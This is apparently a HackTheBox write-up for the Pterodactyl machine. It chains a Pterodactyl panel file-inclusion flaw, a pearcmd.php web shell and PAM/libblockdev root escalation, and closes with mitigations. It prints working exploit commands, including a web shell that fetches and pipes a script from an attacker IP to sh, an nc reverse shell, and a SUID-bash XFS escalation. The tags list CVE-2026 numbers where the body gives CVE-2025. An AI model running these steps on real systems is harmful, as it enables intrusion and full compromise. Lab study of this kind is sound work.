---
title: "Pterodactyl"
date: 2026-05-17 00:00:00 +0500
categories: [HackTheBox, Linux]
tags: [Pterodactyl, LFI-To-RCE, CVE-2026-6018, CVE-2026-6019]
description: Writeup for HackTheBox Pterodactyl machine
image:
  path: assets/img/pterodactyl/pterodactyl.png
  alt: HTB Pterodactyl
---

## Executive Summary

This comprehensive writeup documents the complete exploitation of the **Pterodactyl** machine. The attack chain leverages a combination of a web application vulnerability, a PHP configuration flaw, and advanced Linux local privilege escalation exploits to achieve full system compromise.

**Attack Chain Summary:**

1. **Information Disclosure & LFI (Initial Access):** Enumeration revealed a Pterodactyl game server panel (v1.11.10) hosting a public changelog. An unauthenticated Local File Inclusion (LFI) vulnerability (CVE-2025-49132) in the `/api/locales/locale.json` endpoint was exploited to extract the database configuration file, yielding MySQL credentials and the Laravel `APP_KEY`.
2. **Remote Code Execution (RCE via PHP-PEAR):** The LFI was weaponized into Remote Code Execution by targeting the `pearcmd.php` script. Due to a misconfigured `register_argc_argv` setting in PHP, attackers could pass CLI arguments to `pearcmd.php` via the URL query string, resulting in the creation of a PHP web shell and execution as the `wwwrun` user.
3. **Lateral Movement:** The extracted database credentials were used to dump the `users` table from MySQL. The `phileasfogg3` user's bcrypt password hash was cracked offline, allowing SSH access.
4. **Privilege Escalation to Root:** Root access was achieved by chaining two local vulnerabilities. First, CVE-2025-6018 (PAM Environment Variable Bypass) was used to spoof a physical console session by manipulating `~/.pam_environment`. This granted polkit `allow_active` privileges, which were then used to exploit CVE-2025-6019 (libblockdev XFS Mounting Vulnerability). The attacker mounted a malicious XFS filesystem containing a SUID `bash` binary, which was executed during a filesystem resize operation to gain root privileges.

**Impact:** Complete system compromise. An unauthenticated attacker can exploit the Pterodactyl panel to gain initial access, extract sensitive user data, and utilize local kernel/system vulnerabilities to seize total control of the host machine.

---

## Reconnaissance

### Network Enumeration


The reconnaissance phase begins with identifying all open ports on the target system using an aggressive nmap scan. The command uses a combination of fast port discovery and targeted scanning:

```bash
# -sC: Run default NSE (Nmap Scripting Engine) scripts for service detection
# -sV: Probe open ports to determine service/version info
# -Pn: Skip host discovery (treat all hosts as online)
# -p $(nmap -Pn -p- --min-rate 8000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,): Dynamically discover all open ports
# -oN: Output results in normal format to nmap.scan file

┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$ sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 8000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN nmap.scan
```

**Nmap Output:**
```text
Nmap scan report for 10.129.42.218
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2026-02-12 00:30:02 PKT for 17s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOouXDOkVrDkob+tyXJOHu3twWDqor3xlKgyYmLIrPasaNjhBW/xkGT2otP1zmnkTUyGfzEWZGkZB2Jkaivmjgc=
|   256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJTXNuX5oJaGQJfvbga+jM+14w5ndyb0DN0jWJHQCDd9
80/tcp open  http    syn-ack ttl 63 nginx 1.21.5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.21.5
|_http-title: Did not follow redirect to http://pterodactyl.htb/
```

**Analysis:** Two main services are exposed:
- **SSH (22)**: OpenSSH 9.6 - Recent version, likely patched against known SSH vulnerabilities
- **HTTP (80)**: nginx 1.21.5 - Web server with redirect to `pterodactyl.htb` suggesting virtual hosting


Add the discovered hostname to the local `/etc/hosts` file for proper DNS resolution:

```bash
# Add target IP and hostname mapping for local resolution
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$echo "$ip  pterodactyl.htb" | sudo tee -a /etc/hosts
```

---

## Initial Access - Web Application Analysis

### Web Service Discovery

Navigating to `http://pterodactyl.htb` reveals a game server monitoring platform called "MonitorLand" built on the Pterodactyl panel.

<img src="assets/img/pterodactyl/pterodactyl_htb.png" alt="MonitorLand Homepage">

**Pterodactyl Background:** Pterodactyl is an open-source game server management panel written in PHP, React, and Go. It isolates game servers in Docker containers while providing a web-based management interface. The panel handles multiple game servers including Minecraft, Rust, and other popular games.

### Information Disclosure via Changelog

The `/changelog.txt` file provides valuable system information:

```bash
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$ curl http://pterodactyl.htb/changelog.txt

MonitorLand - CHANGELOG.txt
======================================

Version 1.20.X

[Added] Main Website Deployment
- Deployed the primary landing site for MonitorLand.
- Implemented homepage, and link for Minecraft server.
- Integrated site styling and dark-mode as primary.

[Linked] Subdomain Configuration
- Added DNS and reverse proxy routing for play.pterodactyl.htb.
- Configured NGINX virtual host for subdomain forwarding.

[Installed] Pterodactyl Panel v1.11.10
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```

**Critical Findings:**
- **Panel Version**: Pterodactyl v1.11.10
- **Database**: MariaDB 11.8.3 backend
- **PHP Extensions**: PHP-FPM and PHP-PEAR are enabled

**What PHP-FPM and PHP-PEAR ?**

PHP-FPM (FastCGI Process Manager) maintains a pool of worker processes for handling PHP requests, providing better performance than traditional CGI. PHP-PEAR (PHP Extension and Application Repository) is a package management system that provides the `pear` CLI tool.

The `http://pterodactyl.htb/phpinfo.php` page confirms these configurations:

<img src="assets/img/pterodactyl/phpinfo.png" alt="PHP Configuration">


### Virtual Host Enumeration

Gobuster is used to discover additional virtual hosts:

```shell
# vhost mode: enumerate virtual hosts
# -w: wordlist for subdomain discovery
# -t 40: Use 40 threads for faster enumeration
# --ad: Append discovered domains to /etc/hosts
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$ gobuster vhost -u http://pterodactyl.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 40 --ad
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://pterodactyl.htb
[+] Method:                    GET
[+] Threads:                   40
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
panel.pterodactyl.htb Status: 200 [Size: 1897]
#www.pterodactyl.htb Status: 400 [Size: 157]
#mail.pterodactyl.htb Status: 400 [Size: 157]
Progress: 19966 / 19966 (100.00%)
===============================================================
Finished
===============================================================
```

**Gobuster Output:**
```
panel.pterodactyl.htb Status: 200 [Size: 1897]
```

This reveals `panel.pterodactyl.htb` hosting the Pterodactyl administration panel. Add `panel.pterodactyl.htb` to `/etc/hosts`

```shell
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$ echo "$ip  panel.pterodactyl.htb" | sudo tee -a /etc/hosts
```

### CVE-2025-49132 - Local File Inclusion

**CVE-2025-49132** is a critical Local File Inclusion (LFI) vulnerability affecting Pterodactyl Panel versions up to 1.11.10. Prior to version 1.11.11, using the /locales/locale.json with the locale and namespace query parameters, a malicious actor is able to execute arbitrary code without being authenticated. With the ability to execute arbitrary code it could be used to gain access to the Panel's server, read credentials from the Panel's config, extract sensitive information from the database, access files of servers managed by the panel, etc.

| Attribute | Detail |
|-----------|--------|
| CVE ID | CVE-2025-49132 |
| Affected Component | Pterodactyl Panel `/api/locales/locale.json` endpoint |
| Vulnerability Type | Unauthenticated Local File Inclusion (LFI) |
| Attack Vector | GET parameters `locale` and `namespace` |
| Impact | Remote Code Execution |

**Technical Analysis**

The vulnerable endpoint resides in the `LocaleController` class. The vulnerability stems from the `str_replace('.', '/', $namespace)` call which allows path traversal. The Laravel `Translator`'s loader prepends the locale path, enabling `../` sequences to escape the intended directory. However, due to PHP localization file format requirements, only `.php` files can be read through this vector.

```php
use Illuminate\Translation\Translator;

class LocaleController extends Controller {
    protected Loader $loader;

    public function __construct(Translator $translator){
        $this->loader = $translator->getLoader();
    }

    // Vulnerable code - user input passed directly to loader
    $locales = explode(' ', $request->input('locale') ?? '');
    $namespaces = explode(' ', $request->input('namespace') ?? '');
    $response = [];

    foreach ($locales as $locale) {
        $response[$locale] = [];
        foreach ($namespaces as $namespace) {
            $response[$locale][$namespace] = $this->i18n(
            $this->loader->load($locale, str_replace('.', '/', $namespace))
            );
        } 
    } 
}
```

#### Database Credential Theft

Using the LFI vulnerability to extract database credentials:

```bash
# The vulnerable endpoint accepts locale and namespace parameters
# By traversing directories and pointing to the config path, we can read sensitive files
# locale=../../../pterodactyl: Traveerse to panel root directory
# namespace=config/database: Target Laravel database configuration file
curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database' | jq 
```

Extracted credentials `pterodactyl:PteraPanel` for database `panel`
```json
{
  "../../../pterodactyl": {
    "config/database": {
      "default": "mysql",
      "connections": {
        "mysql": {
          "driver": "mysql",
          "url": "",
          "host": "127.0.0.1",
          "port": "3306",
          "database": "panel",
          "username": "pterodactyl",
          "password": "PteraPanel",
          "unix_socket": "",
          "charset": "utf8mb4",
          "collation": "utf8mb4_unicode_ci",
          "prefix": "",
          "prefix_indexes": "1",
          "strict": "",
          "timezone": "+00{{00}}",
          "sslmode": "prefer",
          "options": {
            "1014": "1"
          }
        }
      },
      "migrations": "migrations",
      "redis": {
        "client": "predis",
        "options": {
          "cluster": "redis",
          "prefix": "pterodactyl_database_"
        },
        "default": {
          "scheme": "tcp",
          "path": "/run/redis/redis.sock",
          "host": "127.0.0.1",
          "username": "",
          "password": "",
          "port": "6379",
          "database": "0",
          "context": []
        },
        "sessions": {
          "scheme": "tcp",
          "path": "/run/redis/redis.sock",
          "host": "127.0.0.1",
          "username": "",
          "password": "",
          "port": "6379",
          "database": "1",
          "context": []
        }
      }
    }
  }
}
```

#### Application Key Extraction

The Laravel `APP_KEY` is crucial for cookie encryption/decryption attacks:

```bash
# Extract the application key from config/app.php
# APP_KEY is used to encrypt Laravel session cookies and can enable deserialization RCE
curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/app' | jq
```
```json
{
  "../../../pterodactyl": {
    "config/app": {
      "version": "1.11.10",
      "name": "Pterodactyl",
      "env": "production",
      "debug": "",
      "url": "http://panel.pterodactyl.htb",
      "timezone": "UTC",
      "locale": "en",
      "fallback_locale": "en",
      "key": "base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=",
      "cipher": "AES-256-CBC",
      "exceptions": {
        "report_all": ""
      }
    }
  }
}
```


This key uses AES-256-CBC cipher for Laravel's encrypted cookies. Copying the cookie pterodactyl's site and decrypting the cookie with [laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer.git):

```bash
# Decrypt an existing encrypted cookie cookie using the leaked APP_KEY
# The tool decrypts Laravel's encrypted cookie format (base64 IV + encrypted value)
┌──(venv)─(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$ python3 laravel_crypto_killer.py decrypt -v eyJpdiI6Im1ZeExWeDRZNGFRZWZoOEdzbFBDN1E9PSIsInZhbHVlIjoiQUlNZTRodkRwcWxMc2VCRGV3ckFMd3hSQTRIZHJINS8vWWJuZktyVFFrb2ZkMG1jcTFybG0xQzluZTlwS1JLcHZvQklVYy82N212V1VSdFlQT0xMZ0xiSG5TbFJBUlAzTVJRd0lCc3dxeHVob3VXUVpHS25mREQ4T2tRbDNUemsiLCJtYWMiOiJmN2E5MTU2OGYyZThmMTIwNGViY2Y4NjhjMzZmODcxNWU3YjkzZDQzYWQwOGFkOTQwNjgzYzdjNDE2OTNmMzZjIiwidGFnIjoiIn0= -k base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
[+] Unciphered value identified!
[*] Unciphered value
55586b985f4aa6e8f7ca512b70fd4c3c639e297c|ailcOFxOIJ7tC7CdMDRCi2QyS8lU5A2mSsiX8wqg
[*] Base64 encoded unciphered version
b'NTU1ODZiOTg1ZjRhYTZlOGY3Y2E1MTJiNzBmZDRjM2M2MzllMjk3Y3xhaWxjT0Z4T0lKN3RDN0NkTURSQ2kyUXlTOGxVNUEybVNzaVg4d3FnDw8PDw8PDw8PDw8PDw8P'     
```

The unencrypted cookie itself is hashed, requiring an alternative exploitation path.

---

## Remote Code Execution via PHP-PEAR

### Technical Background

PHP-PEAR abuse exploits the `register_argc_argv` PHP configuration. From php configuration `/phpinfo.php`, we found that this flag is enabled. When enabled, PHP treats query string parameters as command-line arguments (`$_SERVER['argv']`). The `pearcmd.php` utility can then be manipulated to execute arbitrary commands.

RFC 3875 specifies that query strings should be passed as CLI arguments for CGI PHP, but PHP doesn't strictly follow this. Even with `=` characters in the query string, PHP still populates `$_SERVER['argv']`.


The `pearcmd.php` tool supports the `config-create` command which can write arbitrary content to file.

### Exploit

We will write php webshell, that fetches payload from our webserver and execute it.

```bash
# Exploit pearcmd to create a PHP webshell
# +config-create+: PEAR command to create configuration
# /../../../usr/share/php/PEAR: Target directory path (traversed)
# namespace=pearcmd: Invokes pearcmd via LFI
# The query parameters after ? are passed as CLI arguments to pearcmd
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$  curl -g $'http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system(\'curl${IFS}10.10.15.113/rev.sh|sh\')?>+/tmp/shell.php'
```

Create a reverse shell payload script:

```bash
# Read the payload file - uses FIFO for reliable reverse shell
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$  cat rev.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.113 4444 >/tmp/f

# Start a PHP web server to host the payload
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$ php -S 0.0.0.0:80

# Start netcat listener for reverse shell
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$  ncat -lvnp 4444
```

Execute the uploaded shell through the LFI endpoint:

```bash
# Trigger the shell by requesting the uploaded file via LFI
# The path ../../../../../../tmp points to /tmp where shell.php was written
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$ curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&namespace=shell'
```

Got shell as web user `wwwrun`:
```
# Webserver
[Wed May 20 17:36:43 2026] 10.129.43.57:36042 Accepted
[Wed May 20 17:36:43 2026] 10.129.43.57:36042 [200]: GET /rev.sh
[Wed May 20 17:36:43 2026] 10.129.43.57:36042 Closing

# Reverse shell
Ncat: Connection from 10.129.43.57:60896.
sh: cannot set terminal process group (1214): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ id
uid=474(wwwrun) gid=474(www) groups=474(www)
```

**Success**: Low-privilege shell obtained as `wwwrun` user.

### User Flag

Upgrade the raw shell to an interactive terminal:

```bash
# Create a pseudo-terminal session
sh-4.4$ script -c bash /dev/null

# Suspend the process with Ctrl+Z 
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$ stty -echo raw; fg
reset
# Type 'screen' when prompted for terminal type

# Set proper terminal dimensions. Check your terminal dimension by running stty -a
wwwrun@pterodactyl:/var/www/pterodactyl> stty rows 37 cols 145
wwwrun@pterodactyl:/var/www/pterodactyl> export TERM=xterm
```

Read the user flag from `/home/phileasfogg3`:
```bash
wwwrun@pterodactyl:/var/www/pterodactyl> cat /home/phileasfogg3/user.txt
**************cc2104220c779905
```

---

## Privilege Escalation

### FileSystem Enumeration

Mysql database is running on 127.0.0.1:3306, We dumped the Mysql credentials earlier through LFI, but they are also hardcoded in `/var/www/pterodactyl/.env` file:

```shell
wwwrun@pterodactyl:/var/www/pterodactyl> cat .env
APP_ENV=production
APP_DEBUG=false
APP_KEY=base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
APP_THEME=pterodactyl
APP_TIMEZONE=UTC
APP_URL="http://panel.pterodactyl.htb"
APP_LOCALE=en
APP_ENVIRONMENT_ONLY=false

LOG_CHANNEL=daily
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=panel
DB_USERNAME=pterodactyl
DB_PASSWORD=PteraPanel

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

CACHE_DRIVER=redis
QUEUE_CONNECTION=redis
SESSION_DRIVER=redis

HASHIDS_SALT=pKkOnx0IzJvaUXKWt2PK
HASHIDS_LENGTH=8

MAIL_MAILER=smtp
MAIL_HOST=smtp.example.com
MAIL_PORT=25
MAIL_USERNAME=
MAIL_PASSWORD=
MAIL_ENCRYPTION=tls
MAIL_FROM_ADDRESS=no-reply@example.com
MAIL_FROM_NAME="Pterodactyl Panel"
# You should set this to your domain to prevent it defaulting to 'localhost', causing
# mail servers such as Gmail to reject your mail.
#
# @see: https://github.com/pterodactyl/panel/pull/3110
# MAIL_EHLO_DOMAIN=panel.example.com

APP_SERVICE_AUTHOR="pterodactyl@pterodactyl.htb"
PTERODACTYL_TELEMETRY_ENABLED=false
RECAPTCHA_ENABLED=false
```

#### Database Credential Harvesting

Query the database for user credentials:

```bash
wwwrun@pterodactyl:/var/www/pterodactyl> mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 -D panel -e "show tables;"

wwwrun@pterodactyl:/var/www/pterodactyl> mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 -D panel -e "select username, password from users;"

+--------------+--------------------------------------------------------------+
| username     | password                                                     |
+--------------+--------------------------------------------------------------+
| headmonitor  | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 |
| phileasfogg3 | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi |
+--------------+--------------------------------------------------------------+
```

The bcrypt hashes are cracked offline with john:

```bash
# john reads the hash file and performs dictionary attack with rockyou.txt
┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$  john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

┌──(kali㉿kali)-[~/HTB/Linux/Pterodactyl]
└─$ john hash.txt --show                                            
phileasfogg3:!QAZ2wsx

1 password hash cracked, 1 left
                
```

**Cracked Password:** `phileasfogg3:!QAZ2wsx`

Establish SSH connection for more stable access:

```bash
# sshpass provides password authentication for non-interactive scripts
# StrictHostKeyChecking=no bypasses host key verification for CTF
sshpass -p '!QAZ2wsx' ssh -o StrictHostKeyChecking=no phileasfogg3@pterodactyl.htb
```

---

## CVE-2025-6018 & CVE-2025-6019 Exploitation

### Vulnerability Overview

**CVE-2025-6018** - PAM Environment Variable Bypass

| Attribute | Detail |
|-----------|--------|
| CVE ID | CVE-2025-6018 |
| Component | PAM configuration in openSUSE Leap 15/SLES |
| Vulnerability Type | Authentication Bypass |
| Attack Vector | `~/.pam_environment` manipulation |
| Impact | Polkit "allow_active" privilege escalation |

**CVE-2025-6019** - libblockdev XFS Mounting Vulnerability

| Attribute | Detail |
|-----------|--------|
| CVE ID | CVE-2025-6019 |
| Component | libblockdev via udisks2 daemon |
| Vulnerability Type | Privilege Escalation via SUID binaries |
| Attack Vector | XFS filesystem with SUID binary |
| Impact | Full root access |

### Technical Analysis

#### CVE-2025-6018 - PAM Bypass

openSUSE Leap 15 uses the `targetpw` authentication mechanism where users must enter the target user's password when using sudo. However, CVE-2025-6018 allows bypassing this by manipulating PAM environment variables.

The attack exploits how `systemd-logind` determines user session status. Normally, SSH sessions are marked as "allow_any" (remote) while physical console sessions are "allow_active". By setting `XDG_SEAT=seat0` and `XDG_VTNR=1` in `~/.pam_environment`, SSH sessions are incorrectly identified as physical sessions.

**Verification Before Exploitation:**
```bash
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
# ('challenge',) - indicates remote/unprivileged session
```

#### CVE-2025-6019 - libblockdev SUID Escalation

libblockdev is a library for block device manipulation used by udisks2. When resizing XFS filesystems, it temporarily mounts them in `/tmp` without `nosuid` or `nodev` flags - a security oversight.

An attacker can:
1. Create a malicious XFS image containing a SUID binary
2. Set up a loop device backed by this image
3. Request filesystem resize via udisks2
4. The resize operation mounts the XFS without proper restrictions
5. Execute the embedded SUID binary to gain root privileges

### Exploitation Chain

#### Step 1: Establish Physical Session Status

```bash
# Set environment variables to mimic a physical console session
# OVERRIDE keyword tells PAM to always set these values regardless of other configurations
{ echo 'XDG_SEAT OVERRIDE=seat0'; echo 'XDG_VTNR OVERRIDE=1'; } > ~/.pam_environment

# Exit and reconnect to apply PAM changes
exit
```

After reconnection, verify the polkit status:

```bash
# CanReboot now returns 'yes' instead of 'challenge'
# This confirms we now have 'allow_active' privileges
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
# ('yes',)
```

#### Step 2: Prepare Malicious XFS Filesystem

On the attacker machine, create an XFS filesystem with a SUID bash binary:

```bash
# Create 300MB disk image
# /dev/zero provides null bytes for the image
# bs=1M: block size 1MB
dd if=/dev/zero of=./xfs.image bs=1M count=300

# Format as XFS filesystem
mkfs.xfs ./xfs.image

# Mount the filesystem to write files
sudo mount -t xfs ./xfs.image ./xfs.mount

# Copy bash binary and set SUID bit (04555 = setuid + executable)
sudo cp ./bash ./xfs.mount
sudo chmod 04555 ./xfs.mount/bash

# Unmount and transfer to target
sudo umount ./xfs.mount
```

#### Step 3: Transfer and Execute Payload

On the target machine:

```bash
# Transfer the XFS image
sshpass -p '!QAZ2wsx' scp -o StrictHostKeyChecking=no xfs.image phileasfogg3@pterodactyl.htb:/home/phileasfogg3/xfs.image

# Kill any auto-mounters that might interfere
pkill -KILL gvfs-udisks2-volume-monitor

# Create loop device - udisksctl manages loop devices safely
LOOP_DEV=$(udisksctl loop-setup --file ./xfs.image --no-user-interaction 2>&1 | grep -oP "/dev/loop\\d+")

# Start monitoring loop to catch the mounted SUID binary
# This polls /tmp/blockdev* directories for the SUID bash
( while true; do for dev in /tmp/blockdev*; do 
    if [ -d "$dev" ] && [ -x "$dev/bash" ]; then 
        echo "Caught SUID bash at $dev/bash"; 
        "$dev/bash" -p -c "id; cat /root/root.txt" > /tmp/root_out.txt 2>&1; 
        break 2; 
    fi; 
  done; 
  sleep 0.001; 
done ) &
```

#### Step 4: Trigger Privilege Escalation

```bash
# Request XFS filesystem resize via D-Bus
# This causes libblockdev to mount the XFS in /tmp without nosuid
gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/$(basename "$LOOP_DEV") --method org.freedesktop.UDisks2.Filesystem.Resize 0 "{}" 2>/dev/null

# Wait for the operation to complete
sleep 30
```

#### Step 5: Retrieve Root Flag

```bash
cat /tmp/root_out.txt
# ************244bgew4435er0er35
```

---

## Mitigations & Recommendations

### 1. Update Pterodactyl Panel (Remediate CVE-2025-49132)

**Action:** Upgrade the Pterodactyl Panel to version 1.11.11 or later to patch the unauthenticated Local File Inclusion (LFI) vulnerability.

```bash
# Recommended update procedure for Pterodactyl Panel
php artisan down
curl -L https://github.com/pterodactyl/panel/releases/latest/download/panel.tar.gz | tar -xzv
chmod -R 755 storage/* bootstrap/cache/
php artisan up
```

**Root Cause:** The `/api/locales/locale.json` endpoint allowed unauthenticated users to specify `namespace` and `locale` parameters that were passed to the Laravel `Translator` loader without proper path sanitization. This enabled directory traversal (`../`) to read arbitrary local `.php` files across the filesystem.

---

### 2. Disable `register_argc_argv` in PHP (Remediate PHP-PEAR RCE)

**Action:** Disable the `register_argc_argv` setting in the PHP configuration file to prevent PHP from parsing query strings as command-line arguments when running under FPM or CGI.

```ini
# /etc/php8/fpm/php.ini
register_argc_argv = Off
```

**Root Cause:** The PHP configuration had `register_argc_argv` enabled (`On`). This allowed attackers to use the LFI vulnerability to include the `pearcmd.php` CLI utility and pass malicious command-line arguments (such as `+config-create+`) directly via the URL query string, translating the file read vulnerability into remote code execution.

---

### 3. Patch PAM and libblockdev (Remediate CVE-2025-6018 & CVE-2025-6019)

**Action:** Apply security updates to the OS to patch the `pam_env` module and the `libblockdev` package. Additionally, modern systems should disable the processing of user-level `~/.pam_environment` files by default.

```bash
# Update system packages
zypper update libblockdev pam

# Disable user_readenv in PAM configurations
# Remove or comment out: session required pam_env.so user_readenv=1
```

**Root Cause:** The privilege escalation relied on two chained zero-days/known-flaws:
1. `pam_env` allowed an unprivileged user to spoof a local physical console session by forcing the `XDG_SEAT` and `XDG_VTNR` environment variables via `~/.pam_environment` (CVE-2025-6018).
2. This spoofed session granted sufficient `polkit` privileges to interact with `udisks2`. `udisks2` relied on `libblockdev`, which suffered from an insecure mount operation during XFS resizing. `libblockdev` temporarily mounted the filesystem in `/tmp` without the `nosuid` flag, allowing SUID binaries to be executed from a user-supplied filesystem (CVE-2025-6019).
